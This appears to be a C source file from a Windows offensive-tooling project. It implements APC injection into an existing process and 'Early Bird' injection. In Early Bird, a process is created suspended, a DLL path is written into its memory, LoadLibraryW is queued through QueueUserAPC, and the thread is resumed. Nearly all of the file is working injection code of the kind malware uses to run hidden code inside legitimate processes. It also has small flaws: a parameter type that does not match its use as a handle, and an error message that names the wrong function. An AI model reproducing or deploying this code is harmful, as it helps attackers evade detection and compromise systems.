#include "global.h"

/*
	- APC Injection (also known as Early Bird technique).
	  - **The implementation includes creating a new process instead of injecting a existing one. this is because of QueueUserAPC behaviour**
	  - Searching for `LoadLibraryW` address. We assuming `kernel32` libraries are loaded in same addresses for all processes.
	  - Creating new process in suspended state. The executable is passed by param to the injection function.
	  - Invoking `VirtualAllocEx` to allocate injected DLL name string.
	  - Invoking `WriteProcessMemory` to write that string.
	  - Invoking `QueueUserAPC` with `LoadLibraryW` procedure and DLL name as a parameter. This function queues asynchronous procedure to the therad when he returns from **alertable** state. That state includes returning from the next functions:
		- `kernel32!SleepEx`
		- `kernel32!SignalObjectAndWait`
		- `kernel32!WaitForSingleObject`
		- `kernel32!WaitForSingleObjectEx`
		- `kernel32!WaitForMultipleObjects`
		- `kernel32!WaitForMultipleObjectsEx`
		- `user32!MsgWaitForMultipleObjectsEx`
	  - Invoking `ResumeThread`. Because thread was in suspended state, starting it causes the operating system to invoke his waiting APC, means the injected code.
*/
BOOL makeAPCInjection(PWSTR hTargetProcess, PWSTR pwszDllName) {
	SIZE_T cbAllocationSize, cbBytesWritten;
	PWSTR pwszRemoteDllNameAddr; 
	HANDLE hThreadSnap;
	THREADENTRY32 te;
	HANDLE hThread;
	LPVOID pLoadLibraryW;
	
	if (!getLoadLibraryAddress(&pLoadLibraryW)) {
		return FALSE;
	}

	cbAllocationSize = (wcslen(pwszDllName) + 1) * sizeof(WCHAR);
	if (!allocateAndWriteRemoteProcess
	(hTargetProcess, pwszDllName, cbAllocationSize, &pwszRemoteDllNameAddr)) {
		return FALSE;
	}

	hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (INVALID_HANDLE_VALUE == hThreadSnap) {
		printf("CreateToolhelp32Snapshot failed. Error code %d\n", GetLastError());
		return FALSE;
	}
	te.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hThreadSnap, &te))
	{
		printf("Thread32First failed. Error code %d\n", GetLastError());
		CloseHandle(hThreadSnap);
		return FALSE;
	}

	do
	{
		if (te.th32OwnerProcessID == GetProcessId(hTargetProcess)) {
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
			if (NULL == hThread) {
				printf("OpenThread failed. Error code %d\n", GetLastError());
				continue;
			}

			if (!QueueUserAPC((PAPCFUNC)pLoadLibraryW, hThread, pwszRemoteDllNameAddr)) {
				printf("QueueUserAPC failed. Error code %d\n", GetLastError());
				return FALSE;
			}

			CloseHandle(hThread);
		}
	} while (Thread32Next(hThreadSnap, &te));

	CloseHandle(hThreadSnap);

	return TRUE;
}

BOOL makeEarlyBirdInjection(PWSTR pwszExePath, PWSTR pwszDllName) {
	SIZE_T cbAllocationSize, cbBytesWritten;
	PWSTR pwszRemoteDllNameAddr;
	HANDLE hThread = INVALID_HANDLE_VALUE;
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID pLoadLibraryW;

	if (!getLoadLibraryAddress(&pLoadLibraryW)) {
		return FALSE;
	}

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(pwszExePath, pwszExePath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		DBG_PRINT("CreateProcess failed. Error code %d\n", GetLastError());
		return FALSE;
	}

	hProcess = pi.hProcess;
	hThread = pi.hThread;

	cbAllocationSize = (wcslen(pwszDllName) + 1) * sizeof(WCHAR);
	if (!allocateAndWriteRemoteProcess
	(hProcess, pwszDllName, cbAllocationSize, &pwszRemoteDllNameAddr)) {
		return FALSE;
	}

	if (!QueueUserAPC((PAPCFUNC)pLoadLibraryW, hThread, pwszRemoteDllNameAddr)) {
		DBG_PRINT("QueueUserAPC failed. Error code %d\n", GetLastError());
		return FALSE;
	}

	if (!ResumeThread(hThread)) {
		DBG_PRINT("QueueUserAPC failed. Error code %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}